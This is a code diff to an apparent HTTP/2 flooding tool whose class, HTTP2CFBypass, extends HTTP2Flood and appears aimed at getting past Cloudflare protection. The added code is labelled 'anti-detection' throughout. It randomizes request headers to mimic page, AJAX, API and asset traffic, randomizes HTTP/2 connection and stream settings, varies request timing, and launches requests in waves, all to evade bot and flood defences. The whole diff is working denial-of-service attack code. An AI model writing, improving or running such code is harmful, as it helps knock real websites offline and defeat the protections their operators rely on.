@@ -308,7 +308,11 @@ export class HTTP2CFBypass extends HTTP2Flood {
         const cacheBuster = `?_cb=${Date.now()}_${Tools.randomString(8)}&bypass=${Math.random()}&fp=${Tools.randomString(6)}`;
         headers[':path'] = headers[':path'] + cacheBuster;
         
-        // Random additional headers for variation
+        // Human behavior simulation headers
+        if (Math.random() > 0.6) {
+            headers['x-requested-with'] = 'XMLHttpRequest';
+        }
+        
         if (Math.random() > 0.7) {
             headers['x-api-key'] = Tools.randomString(32);
         }
@@ -317,25 +321,46 @@ export class HTTP2CFBypass extends HTTP2Flood {
             headers['authorization'] = `Bearer ${Tools.randomString(64)}`;
         }
         
+        // Simulate different request types
+        const requestType = Tools.randomChoice(['page', 'ajax', 'api', 'asset']);
+        switch (requestType) {
+            case 'ajax':
+                headers['x-requested-with'] = 'XMLHttpRequest';
+                headers['content-type'] = 'application/json';
+                break;
+            case 'api':
+                headers['accept'] = 'application/json, text/plain, */*';
+                headers['content-type'] = 'application/json';
+                break;
+            case 'asset':
+                headers['accept'] = 'image/webp,image/apng,image/*,*/*;q=0.8';
+                headers['sec-fetch-dest'] = 'image';
+                break;
+            default: // page
+                headers['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
+                headers['sec-fetch-dest'] = 'document';
+        }
+        
         return headers;
     }
 
     async attack() {
         return new Promise((resolve) => {
-            const client = http2.connect(this.url.origin, {
+            // Anti-detection: Random connection settings
+            const connectionSettings = {
                 rejectUnauthorized: false,
-                // Use modern ALPN protocols
                 ALPNProtocols: ['h2', 'http/1.1'],
-                // HTTP/2 settings for maximum aggression
                 settings: {
-                    headerTableSize: 65536,
-                    enablePush: true,
-                    initialWindowSize: 6291456,
-                    maxFrameSize: 16384,
-                    maxConcurrentStreams: 1000,
-                    maxHeaderListSize: 262144
+                    headerTableSize: Tools.randomChoice([4096, 8192, 16384, 32768, 65536]),
+                    enablePush: Tools.randomChoice([true, false]),
+                    initialWindowSize: Tools.randomChoice([65535, 131072, 262144, 1048576, 6291456]),
+                    maxFrameSize: Tools.randomChoice([16384, 32768, 65536]),
+                    maxConcurrentStreams: Tools.randomChoice([100, 250, 500, 1000]),
+                    maxHeaderListSize: Tools.randomChoice([8192, 16384, 65536, 262144])
                 }
-            });
+            };
+            
+            const client = http2.connect(this.url.origin, connectionSettings);
 
             client.on('error', () => {
                 client.close();
@@ -343,7 +368,11 @@ export class HTTP2CFBypass extends HTTP2Flood {
             });
 
             let requestsSent = 0;
-            const totalRequests = this.rpc * 10; // 10x more aggressive
+            const totalRequests = this.rpc;
+            
+            // Anti-detection: Random timing patterns
+            const requestIntervals = [0, 10, 25, 50, 75, 100, 150, 200]; // ms
+            let currentInterval = 0;
 
             const makeRequest = () => {
                 if (!this.active || requestsSent >= totalRequests) {
@@ -353,11 +382,14 @@ export class HTTP2CFBypass extends HTTP2Flood {
                 }
 
                 try {
-                    const req = client.request(this.generateHeaders(), {
-                        weight: 256,
-                        exclusive: false,
-                        parent: 0
-                    });
+                    // Anti-detection: Random HTTP/2 stream settings
+                    const streamSettings = {
+                        weight: Tools.randomChoice([16, 32, 64, 128, 256]),
+                        exclusive: Tools.randomChoice([true, false]),
+                        parent: Tools.randomChoice([0, 1, 3, 5])
+                    };
+                    
+                    const req = client.request(this.generateHeaders(), streamSettings);
 
                     req.on('response', (responseHeaders) => {
                         REQUESTS_SENT.add(1);
@@ -389,23 +421,40 @@ export class HTTP2CFBypass extends HTTP2Flood {
                     BYTES_SENT.add(500); // Accounting for headers
                     requestsSent++;
                     
-                    // Continue immediately for maximum speed
-                    setImmediate(makeRequest);
+                    // Anti-detection: Random delay between requests
+                    const delay = requestIntervals[currentInterval % requestIntervals.length];
+                    currentInterval++;
+                    
+                    if (delay > 0) {
+                        setTimeout(makeRequest, delay);
+                    } else {
+                        setImmediate(makeRequest);
+                    }
                 } catch (e) {
-                    // Silent fail and continue
-                    setImmediate(makeRequest);
+                    // Silent fail and continue with random delay
+                    const retryDelay = Tools.randomChoice([0, 5, 10, 25]);
+                    setTimeout(makeRequest, retryDelay);
                 }
             };
 
-            // Start multiple request chains simultaneously
-            for (let i = 0; i < 20; i++) {
-                makeRequest();
-            }
+            // Anti-detection: Start requests in waves instead of all at once
+            const startWaves = () => {
+                const waveSize = Tools.randomChoice([3, 5, 8, 12, 15]);
+                for (let i = 0; i < waveSize; i++) {
+                    setTimeout(() => makeRequest(), i * Tools.randomChoice([0, 5, 10, 15]));
+                }
+            };
+            
+            // Start multiple waves with delays
+            startWaves();
+            setTimeout(startWaves, 200);
+            setTimeout(startWaves, 500);
+            setTimeout(startWaves, 800);
 
             setTimeout(() => {
                 client.close();
                 resolve();
-            }, 2000); // Longer timeout for more requests
+            }, 3000); // Longer timeout for more requests
         });
     }
 }
